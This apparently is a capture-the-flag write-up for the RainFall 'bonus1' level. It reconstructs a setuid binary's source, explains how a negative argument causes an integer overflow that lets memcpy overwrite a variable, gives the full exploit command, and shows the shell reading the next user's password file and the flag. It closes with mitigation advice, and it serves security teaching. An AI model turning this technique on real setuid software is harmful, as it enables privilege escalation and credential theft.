@@ -1,0 +1,151 @@
+# Bonus1 - Integer Overflow to Buffer Overflow Walkthrough
+
+## Binary Analysis
+```bash
+bonus1@RainFall:~$ file bonus1
+bonus1: setuid setgid ELF 32-bit LSB executable, Intel 80386, dynamically linked
+
+bonus1@RainFall:~$ ./bonus1
+Segmentation fault (core dumped)  # Needs arguments
+
+bonus1@RainFall:~$ ./bonus1 5 test
+bonus1@RainFall:~$  # Nothing happens - normal execution
+```
+
+## Vulnerability Discovery
+
+### GDB Analysis
+```bash
+gdb -q bonus1
+(gdb) disas main
+# Key findings:
+# 1. atoi(argv[1]) → n
+# 2. if (n <= 9) continue, else exit
+# 3. memcpy(buffer, argv[2], n * 4)
+# 4. if (n == 0x574f4c46) execl("/bin/sh")
+```
+
+### Source Code Reconstruction
+```c
+int main(int ac, char **av) {
+    int n;
+    char buffer[40];
+    
+    n = atoi(av[1]);
+    if (!(n <= 9))           // Must be ≤ 9 to continue
+        return (1);
+    memcpy(buffer, av[2], n * 4);  // Copy n*4 bytes
+    if (n == 0x574f4c46)     // Magic value "FLOW"
+        execl("/bin/sh", "sh", NULL);
+    return (0);
+}
+```
+
+## Vulnerability Analysis
+
+### The Challenge
+- **Constraint**: `n <= 9` (max 36 bytes copied)
+- **Goal**: Overwrite `n` with `0x574f4c46` ("FLOW")
+- **Problem**: Buffer is 40 bytes, `n` is at offset 44 - need 44+ bytes!
+
+### The Solution: Integer Overflow
+- **Key Insight**: Use negative numbers!
+- **Calculation**: `-2147483637 * 4 = 44` bytes (due to integer overflow)
+- **Bypass**: `-2147483637 <= 9` is TRUE (signed comparison)
+
+## Exploitation Steps
+
+### Step 1: Find the Magic Number
+```bash
+# 0x574f4c46 in ASCII = "FLOW" (little-endian)
+python -c "import struct; print(repr(struct.pack('<I', 0x574f4c46)))"
+# Output: 'FLOW'
+```
+
+### Step 2: Calculate Negative Overflow
+```python
+# Need 44 bytes to reach n variable
+# 44 / 4 = 11, but 11 > 9 (blocked)
+# Use negative: -2147483637 * 4 = 44 (32-bit overflow)
+# -2147483637 <= 9 is TRUE
+```
+
+### Step 3: Memory Layout Analysis
+```
+Stack Layout:
+┌─────────────────────┐ ← ESP + 0x40
+│ Saved EBP          │
+├─────────────────────┤ ← ESP + 0x3C  
+│ n variable         │ ← TARGET (offset 44 from buffer)
+├─────────────────────┤
+│ buffer[40]         │ ← ESP + 0x14 (buffer start)
+└─────────────────────┘ ← ESP
+```
+
+### Step 4: Craft Payload
+```bash
+# Argument 1: -2147483637 (bypass check, copy 44 bytes)
+# Argument 2: "A" * 40 + "FLOW" (40 bytes padding + target value)
+./bonus1 -2147483637 $(python -c 'print "A" * 40 + "FLOW"')
+```
+
+## Execution Flow
+
+### Normal Execution
+1. `n = atoi("-2147483637")` → `n = -2147483637`
+2. `n <= 9` → TRUE (signed comparison)
+3. `memcpy(buffer, argv[2], -2147483637 * 4)` → copies 44 bytes
+4. Buffer overflow: 40 bytes fill buffer + 4 bytes overwrite `n`
+5. `n` becomes `0x574f4c46` ("FLOW")
+6. `n == 0x574f4c46` → TRUE
+7. `execl("/bin/sh")` → spawn shell
+
+### Complete Exploit
+```bash
+bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A" * 40 + "FLOW"')
+$ whoami
+bonus2
+$ cat /home/user/bonus2/.pass  
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+$ id
+uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
+```
+
+## Attack Analysis
+
+### Why This Works
+1. **Signed Integer Comparison**: `-2147483637 <= 9` is TRUE
+2. **Unsigned Multiplication**: `memcpy()` treats result as unsigned (44 bytes)
+3. **Buffer Overflow**: 44 bytes overwrites both buffer[40] and n variable
+4. **Variable Overwrite**: `n` becomes target value triggering shell
+
+### Integer Overflow Mathematics  
+```c
+// 32-bit signed integer range: -2147483648 to 2147483647
+int n = -2147483637;
+unsigned int size = n * 4;  // -2147483637 * 4 = 44 (wraparound)
+```
+
+## Flag Retrieved
+```
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
+
+## Security Lessons
+
+### Vulnerability Causes
+- **Mixed Sign Handling**: Signed check, unsigned usage
+- **Integer Overflow**: Multiplication overflow not validated
+- **Unsafe Memory Operations**: `memcpy()` with user-controlled size
+
+### Modern Mitigations
+- **Explicit Size Validation**: Check both `n` and `n*4` ranges
+- **Unsigned Comparison**: Use unsigned types consistently  
+- **Safe Functions**: Use `memcpy_s()` or bounds-checked alternatives
+- **Compiler Flags**: Enable integer overflow detection (-ftrapv)
+
+### Key Takeaways
+- **Integer Overflow Attacks**: Negative numbers bypass positive checks
+- **Type Confusion**: Signed vs unsigned interpretation differences  
+- **Variable Proximity**: Stack variables can be overwritten via buffer overflow
+- **Magic Values**: Hardcoded constants create exploitation targets
